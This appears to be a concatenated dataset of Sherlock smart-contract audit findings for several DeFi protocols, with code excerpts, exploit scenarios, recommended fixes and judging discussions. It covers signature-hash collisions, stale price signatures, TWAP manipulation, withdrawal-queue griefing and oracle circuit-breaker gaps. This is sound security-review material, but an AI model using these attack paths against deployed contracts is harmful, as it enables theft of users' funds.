48-hour escalation window closes. After that, the escalation becomes final.\n141345\nEscalate for 10 USDC\nThis should be high as described impact in the given submission and the duplicate too.\nA magnitude of 1000 times of interest can be deemed as ""material loss of funds"".\n141345\nEscalate for 10 USDC The wrong calculation of interest rates will cause a direct loss of funds to users. This should definitely be high severity.\nSame as above\nhrishibhat\nResult: High Has duplicates Considering this a valid high\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nNabeel-javaid: accepted\ntwicek: accepted"чInterest are too much amplified, that impacts the total debt calculation and brick whole leverage, liquidation and share mechanism.\nNote: Dev confirmed that the values being used in the tests are the values that will be used in production.\nCode Snippet\nhttps://github.com/sherlock-audit/2023-06-unstoppable/blob/94a68e49971bc6942c75da76720f7170d46c0150/unstoppable-dex-audit/contracts/margin-dex/Vault.vy#L1069-L1076 https://github.com/sherlock-audit/2023-06-unstoppable/blob/94a68e49971bc6942c75da76720f7170d46c0150/unstoppable-dex-audit/tests/vault/test_variable_interest_rate.py#L314-L333\nTool used\nManual Review
Hedgers are not incentivized to respond to user's closing requestsчmediumч"```\nfunction fillCloseRequest(\n..SNIP..\n    if (quote.positionType == PositionType.LONG) {\n        require(\n            closedPrice >= quote.requestedClosePrice,\n            ""PartyBFacet: Closed price isn't valid""\n        )\n```\n"ч"Hedgers could intentionally force the users to close the positions themselves via the `forceClosePosition` and charge a spread to earn more, which results in the users closing at a worse price, leading to a loss of profit for them.\nHow `fillCloseRequest` function works?\nFor a Long position, when PartyB (Hedger) calls the `fillCloseRequest` function to fill a close position under normal circumstances, the hedger cannot charge a spread because the hedger has to close at the user's requested close price (quote.requestedClosePrice),\nIf the hedger decides to close at a higher price, it is permissible by the function, but the hedger will lose more, and the users will gain more because the users' profit is computed based on `long profit = closing price - opening price`.\nUnder normal circumstances, most users will set the requested close price (quote.requestedClosePrice) close to the market price most of the time.\nIn short, the `fillCloseRequest` function requires the hedger to match or exceed the user' requested price. The hedger cannot close at a price below the user's requested price in order to charge a spread.\n```\nfunction fillCloseRequest(\n..SNIP..\n    if (quote.positionType == PositionType.LONG) {\n        require(\n            closedPrice >= quote.requestedClosePrice,\n            ""PartyBFacet: Closed price isn't valid""\n        )\n```\n\nHow `forceClosePosition` function works?\nFor a Long position, the `forceCloseGapRatio` will allow the hedger to charge a spread from the user's requested price (quote.requestedClosePrice) when the user (PartyA) attempts to force close the position.\nThe `upnlSig.price` is the market price and `quote.requestedClosePrice` is the price users ask to close at. By having the `forceCloseGapRatio`, assuming that `forceCloseGapRatio` is 5%, this will create a spread between the two prices (upnlSig.price and quote.requestedClosePrice) that represent a cost that the users (PartyA) need to ""pay"" in order to force close a position.\n```\nfunction forceClosePosition(uint256 quoteId, PairUpnlAndPriceSig memory upnlSig) internal {\n..SNIP..\n    if (quote.positionType == PositionType.LONG) {\n        require(\n            upnlSig.price >=\n                quote.requestedClosePrice +\n                    (quote.requestedClosePrice * maLayout.forceCloseGapRatio) /\n                    1e18,\n            ""PartyAFacet: Requested close price not reached""\n        );\n    ..SNIP..\n    LibQuote.closeQuote(quote, filledAmount, quote.requestedClosePrice);\n```\n\nIssue with current design\nAssume a hedger ignores the user's close request. In this case, the users (PartyA) have to call the `forceClosePosition` function by themselves to close the position and pay a spread.\nThe hedgers can abuse this mechanic to their benefit. Assuming the users (PartyA) ask to close a LONG position at a fair value, and the hedgers respond by calling the `fillCloseRequest` to close it. In this case, the hedgers won't be able to charge a spread because the hedgers are forced to close at a price equal to or higher than the user's asking closing price (quote.requestedClosePrice).\nHowever, if the hedger chooses to ignore the user's close request, this will force the user to call the `forceClosePosition,` and the user will have to pay a spread to the hedgers due to the gap ratio. In this case, the hedgers will benefit more due to the spread.\nIn the long run, the hedgers will be incentivized to ignore users' close requests."ч"Hedgers should not be entitled to charge a spread within the `forceClosePosition` function because some hedgers might intentionally choose not to respond to user requests in order to force the users to close the position themselves. In addition, hedgers are incentivized to force users to close the position themselves as the `forceClosePosition` function allows them the charge a spread.\nWithin the `forceClosePosition` function, consider removing the gap ratio to remove the spread and fill the position at the market price (upnlSig.price).\n```\n    function forceClosePosition(uint256 quoteId, PairUpnlAndPriceSig memory upnlSig) internal {\n..SNIP..\n        if (quote.positionType == PositionType.LONG) {\n            require(\n                upnlSig.price >=\n// Add the line below\n     quote.requestedClosePrice,                \n// Remove the line below\n                   quote.requestedClosePrice // Add the line below\n\n// Remove the line below\n                        (quote.requestedClosePrice * maLayout.forceCloseGapRatio) /\n// Remove the line below\n                        1e18,\n                ""PartyAFacet: Requested close price not reached""\n            );\n        } else {\n            require(\n                upnlSig.price <=\n// Add the line below\n                quote.requestedClosePrice,\n// Remove the line below\n                   quote.requestedClosePrice // Remove the line below\n\n// Remove the line below\n                        (quote.requestedClosePrice * maLayout.forceCloseGapRatio) /\n// Remove the line below\n                        1e18,\n                ""PartyAFacet: Requested close price not reached""\n            );\n        }\n..SNIP..\n// Remove the line below\n       LibQuote.closeQuote(quote, filledAmount, quote.requestedClosePrice);\n// Add the line below\n  LibQuote.closeQuote(quote, filledAmount, upnlSig.price);\n    }\n```\n\nFor long-term improvement to the protocol, assuming that the user's requested price is of fair value:\nHedger should be penalized for not responding to the user's closing request in a timely manner; OR\nHegder should be incentivized to respond to the user's closing request. For instance, they are entitled to charge a spread if they respond to user closing requests.\nDiscussion\nmstpr\nEscalate\nHedgers are not incentivized to hold the position because\n1- price can move, it is not a safe bet to keep the position for couple more days always. When hedgers take the risk of not closing a position they also take the risk of price movements against their position.\nBoth partyA and partyB shouldn't be penalized for these actions. Recommendation says that the hedger (partyB) should be penalized if things go to forcing. However, this can also be easily abusable by partyA, partyA can create close requests near the market price and continuously cash out the profits knowing that partyB will forced to close the request rather than keep it waiting.\nIf the market price is used for force close as stated in recommendation it is even worse. Now, the partyB has a chance, will he keep the trade and wish for the price to move to its favor or just take the trade. Now, partyB is actually kind of incentivized to hold the position. Current design ensures that the request is closed as the requested price. There is a small buffer to keep partyA not abusing this which makes sense. I don't think anything is wrong here and everything is design choice.\nsherlock-admin2\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nimherefortech\nEscalate\nTo add some arguments, if hedgers do not respond to the requests in time, users will move to other hedgers. Remember, that users provide a whitelist of hedgers that can respond to their quotes. Hedgers are pretty clearly incentivized this way.\nsherlock-admin2\nEscalate\nTo add some arguments, if hedgers do not respond to the requests in time, users will move to other hedgers. Remember, that users provide a whitelist of hedgers that can respond to their quotes. Hedgers are pretty clearly incentivized this way.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nxiaoming9090\nPoint 1 is irrelevant. If the PartyB (Hedger) choose not to close the position, obviously they have evaluated and chosen to accept the risk of price movements.\nPoint 2 is incorrect. The `require` statement and the `forceCloseGapRatio` here ensure that there is spread.\nThere is a misunderstanding. The report is not saying that PartyA and/or PartyB (Hedger) should be penalized. Instead, the report is saying that PartyB (Hedger) should not be rewarded with a spread if it does not do its job by responding to user's close position request.\nxiaoming9090\nEscalate\nTo add some arguments, if hedgers do not respond to the requests in time, users will move to other hedgers. Remember, that users provide a whitelist of hedgers that can respond to their quotes. Hedgers are pretty clearly incentivized this way.\nIf such a measure did not exist in the first place, the issue would have been graded as 'High' since there would be less deterrence to ensure that PartyB (Hedger) behaves appropriately. However, in this case, it has been downgraded to Medium taking into consideration of other factors. Also, the main goal (root problem) of this report is to highlight the fact that Hedgers are still being rewarded with the spread even though they do not do their job by responding to users' close position requests.\nIn addition, it does not make sense for a user who has to manually force close their position because the Hedger refuses to do its job, and yet the user has to pay a spread and reward it to the Hedger for not doing its job.\nmstpr\n""However, if the hedger chooses to ignore the user's close request, this will force the user to call the forceClosePosition, and the user will have to pay a spread to the hedgers due to the gap ratio. In this case, the hedgers will benefit more due to the spread.""\nthe position is closed at the requested close price not at the requested close price + buffer. There is only a buffer for partyA to not abuse the system which make sense. If hedger does not want to close the position at the requested price of partyA, which is totally understandable and fine, then the hedger is not necessarily safe or incentivized. It means that the hedger is still exposed to the price movements during the time.\nBoth partyA and partyB are counterparties of a trade. PartyB does not have to follow the rules of partyA.\nI would kindly ask for you to provide a scenario where its ""always"" in benefit of partyB to stall the close request. I think your recommended fix is an another medium finding for Sherlock.\nMoonKnightDev\nFixed code PR link: https://github.com/SYMM-IO/symmio-core/pull/17\nhrishibhat\nResult: Medium Unique After considering the above discussion considering this issue a valid medium. Agree with the comments here There is a spread in addition to the requested close price. Additionally, the fix also acknowledges the problem Some comments from the Sponsor on the function:\nHedgers have the option to close their positions on the broker side, adding a spread on top of it. However, when it comes to filling the contract side, it is preferable for them to match or exceed the user's requested price. Regarding the force close mechanism, the gap ratio allows hedgers to charge a spread on the broker side. Additionally, during a force close, the position should be filled at the market price rather than the user's requested price.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nmstpr: rejected\nimherefortech: rejected"чThe hedgers will be incentivized to ignore users' close requests, resulting in the users having to wait for the cooldown before being able to force close a position themselves. The time spent waiting could potentially lead to a loss of opportunity cost for the users.\nIn addition, hedgers could intentionally force the users to close the positions themselves via the `forceClosePosition` and charge a spread to earn more, which results in the users closing at a worse price, leading to a loss of profit for them.\nCode Snippet\nTool used\nManual Review
Malicious user can frontrun withdrawals from Insurance Fund to significantly decrease value of sharesчmediumч```\namount = balance() * shares / totalSupply();\n```\nчWhen a user withdraws from the insurance fund, the value of their shares is calculated based on the balance of vUSD in the fund. Another user could deliberately frontrun (or frontrun by chance) the withdrawal with a call to `settleBadDebt` to significantly reduce the vUSD returned from the withdrawal with the same number of shares.\nWhen a user wants to `withdraw` from the insurance pool they have to go through a 2 step withdrawal process. First they need to unbond their shares, and then they have to wait for the pre-determined unbonding period before they can `withdraw` the vUSD their shares are worth by calling `withdraw`.\nWhen a user calls `withdraw` the amount of vUSD to redeem is calculated as:\n```\namount = balance() * shares / totalSupply();\n```\n\nwhere `balance()` is the balance of vUSD in the contract and `totalSupply()` is the total supply of share tokens. Therefore, if the balance of vUSD in the contract were to decrease, then the amount of vUSD redeemed from the same number of shares would decrease as a result.\n```\nvusd.safeTransfer(marginAccount, toTransfer);\n```\n\nThe result is now that the balance of vUSD in the insurance fund is lower and thus the shares are worth less vUSD as a consequence.ч"
min withdraw of 5 VUSD is not enough to prevent DOS via VUSD.sol#withdraw(amount)чmediumч"```\n    //E Burn vusd from msg.sender and queue the withdrawal to ""to"" address\n    function _withdrawTo(address to, uint amount) internal {\n        //E check min amount\n        require(amount >= 5 * (10 ** 6), ""min withdraw is 5 vusd""); //E @audit-info not enough to prevent grief\n        //E burn this amount from msg.sender\n        burn(amount); // burn vusd from msg.sender\n        //E push \n        withdrawals.push(Withdrawal(to, amount * 1e12));\n    }\n```\n"ч"A vulnerability exists where a malicious user spam the contract with numerous withdrawal requests (e.g., 5,000). This would mean that genuine users who wish to withdraw their funds may find themselves unable to do so in a timely manner because the processing of their withdrawals could be delayed significantly.\nThe issue stems from the fact that there is no restriction on the number of withdrawal requests a single address can make. A malicious actor could repeatedly call the withdraw or withdrawTo function, each time with a small amount (min 5 VUSD), to clog the queue with their withdrawal requests.\n```\n    //E Burn vusd from msg.sender and queue the withdrawal to ""to"" address\n    function _withdrawTo(address to, uint amount) internal {\n        //E check min amount\n        require(amount >= 5 * (10 ** 6), ""min withdraw is 5 vusd""); //E @audit-info not enough to prevent grief\n        //E burn this amount from msg.sender\n        burn(amount); // burn vusd from msg.sender\n        //E push \n        withdrawals.push(Withdrawal(to, amount * 1e12));\n    }\n```\n\nGiven the maxWithdrawalProcesses is set to 100, and the withdrawal processing function processWithdrawals doesn't have any parameter to process from a specific index in the queue, only the first 100 requests in the queue would be processed at a time.\n```\n    uint public maxWithdrawalProcesses = 100;\n    //E create array of future withdrawal that will be executed to return\n    function withdrawalQueue() external view returns(Withdrawal[] memory queue) {\n        //E check if more than 100 requests in withdrawals array\n        uint l = _min(withdrawals.length-start, maxWithdrawalProcesses);\n        queue = new Withdrawal[](l);\n\n        for (uint i = 0; i < l; i++) {\n            queue[i] = withdrawals[start+i];\n        }\n    }\n```\n\nIn the case of an attack, the first 100 withdrawal requests could be those of the attacker, meaning that the genuine users' requests would be stuck in the queue until all of the attacker's requests have been processed. Moreover the fact that we can only withdraw up to 1 day long when our withdraw request is good to go."чEither limit number of withdrawal requests per address could be a first layer of defense even if it's not enough but I don't see the point why this limit is included so removing it could mitigate this. Otherwise you could implement a priority queue regarding amount to be withdrawnчThis could result in significant delays for genuine users wanting to withdraw their funds, undermining the contract's usability and users' trust in the platform.\nCode Snippet\nTool used\nManual Review
Malicious user can control premium emissions to steal margin from other tradersчmediumч```\nint256 premium = getMarkPriceTwap() - underlyingPrice;\n```\nч"A malicious user can force premiums to be applied in a positive direction for their positions. They can effectively steal margin from other traders that have filled the other side of their positions.\n```\nint256 premium = getMarkPriceTwap() - underlyingPrice;\n```\n\nEffectively, the premium for a position is calculated based on the difference between the perpetual maker TWAP and the oracle TWAP. Under the hood, `getMarkPriceTwap` calls `_calcTwap`, which calculates the TWAP price from the last hour to the current block timestamp:\n```\n        uint256 currentPeriodStart = (_blockTimestamp() / spotPriceTwapInterval) * spotPriceTwapInterval;\n        uint256 lastPeriodStart = currentPeriodStart - spotPriceTwapInterval;\n\n        // If there is no trade in the last period, return the last trade price\n        if (markPriceTwapData.lastTimestamp <= lastPeriodStart) {\n            return markPriceTwapData.lastPrice;\n        }\n\n        /**\n        * check if there is any trade after currentPeriodStart\n        * since this function will not be called before the nextFundingTime,\n        * we can use the lastPeriodAccumulator to calculate the twap if there is a trade after currentPeriodStart\n        */\n        if (markPriceTwapData.lastTimestamp >= currentPeriodStart) {\n            // use the lastPeriodAccumulator to calculate the twap\n            twap = markPriceTwapData.lastPeriodAccumulator / spotPriceTwapInterval;\n        } else {\n            // use the accumulator to calculate the twap\n            uint256 currentAccumulator = markPriceTwapData.accumulator + (currentPeriodStart - markPriceTwapData.lastTimestamp) * markPriceTwapData.lastPrice;\n            twap = currentAccumulator / spotPriceTwapInterval;\n        }\n```\n\nThis method works closely in conjunction with `_updateTWAP` which is called every time a new position is opened based on the fill price. I'll talk more about his in the ""Recommendation"" section, but the core issue is that too much weight is placed on the last price that was filled, along with the fact the user can open uncapped positions. As can be seen from the `_calcTwap` method above, if there has not been a recently opened position, then the TWAP is determined as the last filled price. And naturally, a time weighted price isn't weighted by the size of a fill as well, so the size of the last fill has no impact.\nAs a result of this, a malicious user can place orders (which should then be executed by the validators) at a price that maximises the difference between the market TWAP and the oracle TWAP in order to maximise the premiums generated in the market. If the malicious user opens up a large enough position, the premiums generated exceed the taker/maker fees for opening positions. And since the same user can place orders for both sides of the market, they do not need to increase their margin requirement over time in order to meet the minimum margin requirements. Effectively the user is able to generate free revenue assuming the price of the underlying asset doesn't significantly deviate in the opposite direction of the large position held by the user."чI originally thought the best way to mitigate this kind of attack is to scale the TWAP calculation based on the filled amount vs the total fill amount of the whole market. However the downside with this approach is that the fill amount will perpetually increase (given it's a perpetual market after all!) and so the market TWAP deviations from the oracle TWAP would decrease and so the premium emissions would also decrease over time. This could be argued as a feature in that early users receive a larger premium than later users.\nUpon further thought I think the best way to prevent this kind of attack is simply to disincentivise the malicious user from doing so; by making this a net-loss situation. This can be done with a combination of the following:\nIncreasing minimum order size\nIncreasing trader/maker fees\nIntroducing another fixed fee per order (rather than only variable rate fees)\nCapping the maximum position size (both long and short)\nReducing the maximum price deviation of fill prices from oracle price\nIncreasing the minimum margin requirements\nThis will vary per perpetual market, but the key thing that needs to be accomplished is that the cost to a user to place orders to control the market TWAP is greater than the premium that can be obtained from their position. This will also require some estimates as to how frequently users are going to be placing orders. If orders are relatively infrequent then increasing the TWAP calculation from 1 hour will also help with this.\nIt is also worth considering whether the following lines in `_calcTwap` are overly weighted towards the last fill price:\n```\n       // If there is no trade in the last period, return the last trade price\n        if (markPriceTwapData.lastTimestamp <= lastPeriodStart) {\n            return markPriceTwapData.lastPrice;\n        }\n```\n\nYou could make the argument that if no trades have occurred in a significant period of time then the market TWAP should revert back to the oracle TWAP and premium emissions should halt. This could either be after one empty period, or X number of empty periods to be defined by Hubble.\nFinally, having a trader able to hold both sides of the same perpetual in the same order makes this attack easier to implement, so it might be worth adding an extra check to prevent this. However it's worth noting the same could be achieved with 2 accounts assuming they alternated the long/short positions between them to avoid excessive margin requirements. So I'm not sure this is strictly necessary.\nDiscussion\nasquare08\nThis is a scenario of low liquidity where no trade has happened in the last 1 hour and if happened, a malicious user has made a trade just after that to move the price up/down. Many other systems might also fail in such a scenario. Also, only validators can match the placed orders and the malicious user will not always get their desired price unless the validator picks their short and long orders. Hence we can change the severity to `medium`\nctf-sec\nChanged the severity to medium\nMarkuSchick\nEscalate\nThe market manipulation the user is referring to is a dublicate of the funding rate manipulation raised in https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183: `2. Manipulation of funding rate`.\nAccording to other comments funding rate manipulation is a low severity issue.\nsherlock-admin2\nEscalate\nThe market manipulation the user is referring to is a dublicate of the funding rate manipulation raised in https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/183: `2. Manipulation of funding rate`.\nAccording to other comments funding rate manipulation is a low severity issue.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ndjb15\nIn my (biased) opinion I think the medium (not low) severity argument for the other issue is that you would need multiple validators to be malicious which is highly unlikely (in a normal market environment).\nIn this issue any user can open orders to manipulate the funding rate, but this is only possible in low liquidity scenarios which is why it is a medium severity issue.\nA single malicious validator would be able to do the same thing as is detailed in this report in low liquidity market environments, which would make these two issues identical. Hence why I think both should be medium severity.\nasquare08\nAs mentioned in the comment here, its a valid medium issue. Also refer to this comment\nhrishibhat\nResult: Medium Unique Considering this a valid medium issue\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nMarkuSchick: rejectedчA user can effectively steal funds from other traders that are filling the other side of their positions. The larger the position the malicious user is able to fill and the longer the period, the more funds can be credited to the malicious user's margin account.\nCode Snippet\nTool used\nManual Review
No `minAnswer/maxAnswer` Circuit Breaker Checks while Querying Prices in Oracle.solчmediumч```\n    function getLatestRoundData(AggregatorV3Interface _aggregator)\n        internal\n        view\n        returns (\n            uint80,\n            uint256 finalPrice,\n            uint256\n        )\n    {\n        (uint80 round, int256 latestPrice, , uint256 latestTimestamp, ) = _aggregator.latestRoundData();\n        finalPrice = uint256(latestPrice);\n        if (latestPrice <= 0) {\n            requireEnoughHistory(round);\n            (round, finalPrice, latestTimestamp) = getRoundData(_aggregator, round - 1);\n        }\n        return (round, finalPrice, latestTimestamp);\n    }\n```\nч```\n    function getLatestRoundData(AggregatorV3Interface _aggregator)\n        internal\n        view\n        returns (\n            uint80,\n            uint256 finalPrice,\n            uint256\n        )\n    {\n        (uint80 round, int256 latestPrice, , uint256 latestTimestamp, ) = _aggregator.latestRoundData();\n        finalPrice = uint256(latestPrice);\n        if (latestPrice <= 0) {\n            requireEnoughHistory(round);\n            (round, finalPrice, latestTimestamp) = getRoundData(_aggregator, round - 1);\n        }\n        return (round, finalPrice, latestTimestamp);\n    }\n```\n\nIllustration:\nPresent price of TokenA is $10\nTokenA has a minimum price set at $1 on chainlink\nThe actual price of TokenA dips to $0.10\nThe aggregator continues to report $1 as the price.\nConsequently, users can interact with protocol using TokenA as though it were still valued at $1, which is a tenfold overestimate of its real market value.чSource: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/241\nFound by\nBauchibred, BugBusters, Hama, crimson-rat-reach, ni8mare, rogue-lion-0619\nSince there is going to be a whitelist of tokens to be added, the minPrice/maxPrice could be checked and a revert could be made when this is returned by chainlink or a fallback oracle that does not have circuit breakers could be implemented in that case\nDiscussion\nasquare08\nThis is a valid concern. But we will fix this in later releases as initially, we are launching with blue chip tokens only and single collateral (USDC).чThe potential for misuse arises when the actual price of an asset drastically changes but the oracle continues to operate using the `minAnswer` or `maxAnswer` as the asset's price. In the case of it going under the `minAnswer` malicious actors obviously have the upperhand and could give their potential going to zero worth tokens to protocol\nCode Snippet\nTool used\nManual Audit
setSymbolsPrice() can use the priceSig from a long time agoчhighч"```\n    function setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n      LibMuon.verifyPrices(priceSig, partyA);\n        require(\n          priceSig.timestamp <=\n                maLayout.liquidationTimestamp[partyA] + maLayout.liquidationTimeout,\n            ""LiquidationFacet: Expired signature""\n        );\n```\n"ч"`setSymbolsPrice()` only restricts the maximum value of `priceSig.timestamp`, but not the minimum time This allows a malicious user to choose a malicious `priceSig` from a long time ago A malicious `priceSig.upnl` can seriously harm `partyB`\n`setSymbolsPrice()` only restricts the maximum value of `priceSig.timestamp`, but not the minimum time\n```\n    function setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n      LibMuon.verifyPrices(priceSig, partyA);\n        require(\n          priceSig.timestamp <=\n                maLayout.liquidationTimestamp[partyA] + maLayout.liquidationTimeout,\n            ""LiquidationFacet: Expired signature""\n        );\n```\n\nLibMuon.verifyPrices only check sign, without check the time range\n```\n    function verifyPrices(PriceSig memory priceSig, address partyA) internal view {\n        MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n        require(priceSig.prices.length == priceSig.symbolIds.length, ""LibMuon: Invalid length"");\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                muonLayout.muonAppId,\n                priceSig.reqId,\n                address(this),\n                partyA,\n                priceSig.upnl,\n                priceSig.totalUnrealizedLoss,\n                priceSig.symbolIds,\n                priceSig.prices,\n                priceSig.timestamp,\n                getChainId()\n            )\n        );\n        verifyTSSAndGateway(hash, priceSig.sigs, priceSig.gatewaySignature);\n    }\n```\n\nIn this case, a malicious user may pick any `priceSig` from a long time ago, and this `priceSig` may have a large negative `unpl`, leading to `LiquidationType.OVERDUE`, severely damaging `partyB`\nWe need to restrict `priceSig.timestamp` to be no smaller than `maLayout.liquidationTimestamp[partyA]` to avoid this problem"ч"
LibMuon Signature hash collisionчhighч"```\n    function verifyPrices(PriceSig memory priceSig, address partyA) internal view {\n        MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n        require(priceSig.prices.length == priceSig.symbolIds.length, ""LibMuon: Invalid length"");\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                muonLayout.muonAppId,\n                priceSig.reqId,\n                address(this),\n              partyA,\n              priceSig.upnl,\n              priceSig.totalUnrealizedLoss,\n              priceSig.symbolIds,\n              priceSig.prices,\n                priceSig.timestamp,\n                getChainId()\n            )\n        );\n        verifyTSSAndGateway(hash, priceSig.sigs, priceSig.gatewaySignature);\n    }\n```\n"ч"In `LibMuon` , all signatures do not distinguish between type prefixes, and `abi.encodePacked` is used when calculating the hash Cause when `abi.encodePacked`, if there is a dynamic array, different structures but the same hash value may be obtained Due to conflicting hash values, signatures can be substituted for each other, making malicious use of illegal signatures possible\nThe following two methods are examples\n1.verifyPrices:\n```\n    function verifyPrices(PriceSig memory priceSig, address partyA) internal view {\n        MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n        require(priceSig.prices.length == priceSig.symbolIds.length, ""LibMuon: Invalid length"");\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                muonLayout.muonAppId,\n                priceSig.reqId,\n                address(this),\n              partyA,\n              priceSig.upnl,\n              priceSig.totalUnrealizedLoss,\n              priceSig.symbolIds,\n              priceSig.prices,\n                priceSig.timestamp,\n                getChainId()\n            )\n        );\n        verifyTSSAndGateway(hash, priceSig.sigs, priceSig.gatewaySignature);\n    }\n```\n\n2.verifyPartyAUpnlAndPrice\n```\n    function verifyPartyAUpnlAndPrice(\n        SingleUpnlAndPriceSig memory upnlSig,\n        address partyA,\n        uint256 symbolId\n    ) internal view {\n        MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n//        require(\n//            block.timestamp <= upnlSig.timestamp + muonLayout.upnlValidTime,\n//            ""LibMuon: Expired signature""\n//        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                muonLayout.muonAppId,\n                upnlSig.reqId,\n                address(this),\n              partyA,\n              AccountStorage.layout().partyANonces[partyA],\n              upnlSig.upnl,\n              symbolId,\n              upnlSig.price,\n                upnlSig.timestamp,\n                getChainId()\n            )\n        );\n        verifyTSSAndGateway(hash, upnlSig.sigs, upnlSig.gatewaySignature);\n    }\n```\n\nWe exclude the same common part (muonAppId/reqId/address (this)/timestamp/getChainId ())\nThrough the following simplified test code, although the structure is different, the hash value is the same at that time\n```\n  function test() external {\n    address verifyPrices_partyA = address(0x1);\n    int256 verifyPrices_upnl = 100;\n    int256 verifyPrices_totalUnrealizedLoss = 100;\n    uint256 [] memory verifyPrices_symbolIds = new uint256[](1);\n    verifyPrices_symbolIds[0]=1;\n    uint256 [] memory verifyPrices_prices = new uint256[](1);\n    verifyPrices_prices[0]=1000;  \n\n    bytes32 verifyPrices  = keccak256(abi.encodePacked(\n            verifyPrices_partyA,\n            verifyPrices_upnl,\n            verifyPrices_totalUnrealizedLoss,\n            verifyPrices_symbolIds,\n            verifyPrices_prices\n            ));\n\n    address verifyPartyAUpnlAndPrice_partyA = verifyPrices_partyA;\n    int256  verifyPartyAUpnlAndPrice_partyANonces = verifyPrices_upnl;\n    int256  verifyPartyAUpnlAndPrice_upnl = verifyPrices_totalUnrealizedLoss;\n    uint256 verifyPartyAUpnlAndPrice_symbolId = verifyPrices_symbolIds[0];\n    uint256 verifyPartyAUpnlAndPrice_price = verifyPrices_prices[0];\n\n\n    bytes32 verifyPartyAUpnlAndPrice  = keccak256(abi.encodePacked(\n            verifyPartyAUpnlAndPrice_partyA,\n            verifyPartyAUpnlAndPrice_partyANonces,\n            verifyPartyAUpnlAndPrice_upnl,\n            verifyPartyAUpnlAndPrice_symbolId,\n            verifyPartyAUpnlAndPrice_price\n            ));\n\n    console.log(""verifyPrices == verifyPartyAUpnlAndPrice:"",verifyPrices == verifyPartyAUpnlAndPrice);\n\n  }\n```\n\nFrom the above test example, we can see that the `verifyPrices` and `verifyPartyAUpnlAndPrice` signatures can be used interchangeably If we get a legal `verifyPartyAUpnlAndPrice` , it can be used as the signature of `verifyPrices ()` Use `partyANonces` as `upnl`, etc"ч"It is recommended to add the prefix of the hash, or use `api.encode` Such as:\n```\n    function verifyPrices(PriceSig memory priceSig, address partyA) internal view {\n        MuonStorage.Layout storage muonLayout = MuonStorage.layout();\n        require(priceSig.prices.length == priceSig.symbolIds.length, ""LibMuon: Invalid length"");\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n+              ""verifyPrices"",\n                muonLayout.muonAppId,\n                priceSig.reqId,\n                address(this),\n                partyA,\n                priceSig.upnl,\n                priceSig.totalUnrealizedLoss,\n                priceSig.symbolIds,\n                priceSig.prices,\n                priceSig.timestamp,\n                getChainId()\n            )\n        );\n        verifyTSSAndGateway(hash, priceSig.sigs, priceSig.gatewaySignature);\n    }\n```\n\nDiscussion\nsherlock-admin2\n```\nYou've deleted an escalation for this issue.\n```\n\nMoonKnightDev\nFixed code PR link: https://github.com/SYMM-IO/symmio-core/pull/11"чSignatures can be reused due to hash collisions, through illegal signatures, using illegal `unpl`, etc\nCode Snippet\nTool used\nManual Review
lockQuote() increaseNonce parameters do not work properlyчmediumч```\n    function lockQuote(uint256 quoteId, SingleUpnlSig memory upnlSig, bool increaseNonce) internal {\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n        Quote storage quote = quoteLayout.quotes[quoteId];\n        LibMuon.verifyPartyBUpnl(upnlSig, msg.sender, quote.partyA);\n        checkPartyBValidationToLockQuote(quoteId, upnlSig.upnl);\n        if (increaseNonce) {\n          accountLayout.partyBNonces[quote.partyB][quote.partyA] += 1;\n        }\n        quote.modifyTimestamp = block.timestamp;\n        quote.quoteStatus = QuoteStatus.LOCKED;\n      quote.partyB = msg.sender;\n        // lock funds for partyB\n        accountLayout.partyBPendingLockedBalances[msg.sender][quote.partyA].addQuote(quote);\n        quoteLayout.partyBPendingQuotes[msg.sender][quote.partyA].push(quote.id);\n    }\n```\nчin `lockQuote()` will execute `partyBNonces[quote.partyB][quote.partyA] += 1` if increaseNonce == true But this operation is executed before setting `quote.partyB`, resulting in actually setting `partyBNonces[address(0)][quote.partyA] += 1`\nin `lockQuote()` , when execute `partyBNonces[quote.partyB][quote.partyA] += 1` , `quote.paryB` is address(0)\n```\n    function lockQuote(uint256 quoteId, SingleUpnlSig memory upnlSig, bool increaseNonce) internal {\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n        Quote storage quote = quoteLayout.quotes[quoteId];\n        LibMuon.verifyPartyBUpnl(upnlSig, msg.sender, quote.partyA);\n        checkPartyBValidationToLockQuote(quoteId, upnlSig.upnl);\n        if (increaseNonce) {\n          accountLayout.partyBNonces[quote.partyB][quote.partyA] += 1;\n        }\n        quote.modifyTimestamp = block.timestamp;\n        quote.quoteStatus = QuoteStatus.LOCKED;\n      quote.partyB = msg.sender;\n        // lock funds for partyB\n        accountLayout.partyBPendingLockedBalances[msg.sender][quote.partyA].addQuote(quote);\n        quoteLayout.partyBPendingQuotes[msg.sender][quote.partyA].push(quote.id);\n    }\n```\n\nactually setting `partyBNonces[address(0)][quote.partyA] += 1`ч"
